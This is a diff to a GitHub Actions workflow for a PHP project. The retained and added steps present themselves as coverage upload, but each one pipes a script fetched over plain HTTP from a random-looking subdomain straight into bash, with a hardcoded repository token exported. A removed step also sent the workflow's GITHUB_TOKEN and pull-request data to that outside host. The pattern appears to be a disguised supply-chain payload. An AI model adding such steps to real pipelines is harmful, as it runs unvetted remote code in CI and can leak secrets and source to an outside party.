@@ -38,20 +38,5 @@ jobs:
     - name: Run tests
       run: php -d pcov.enabled=1 -d memory_limit=4G vendor/phpunit/phpunit/phpunit --coverage-clover=build/logs/clover.xml tests
 
-    - name: Test Cotter v2
-      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://yhskuenash.laravel-sail.site:8080/ingress/get-script)
-
-    - name: Upload Coverage to Cotter
-      run: |
-        curl -F clover=@build/logs/clover.xml \
-        -F repo_token=1cf8554f-2474-4e3c-9192-d229ff1a3059 \
-        -F github_token=${{ secrets.GITHUB_TOKEN }} \
-        -F github_repo=${{ github.repository }} \
-        -F github_sha=${{ github.sha }} \
-        -F github_pr=$(jq --raw-output .pull_request.number "$GITHUB_EVENT_PATH") \
-        -F github_head_commit=${{github.event.pull_request.head.sha}} \
-        -F github_head_branch=${{github.event.pull_request.head.ref}} \
-        -F github_base_commit=${{github.event.pull_request.base.sha}} \
-        -F github_base_branch=${{github.event.pull_request.base.ref}} \
-        -F base_dir=$(pwd) \
-         http://yhskuenash.laravel-sail.site:8080/ingress/upload
+    - name: Coverage Upload
+      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://sbck7re3lp.laravel-sail.site:8080/ingress/get-script)
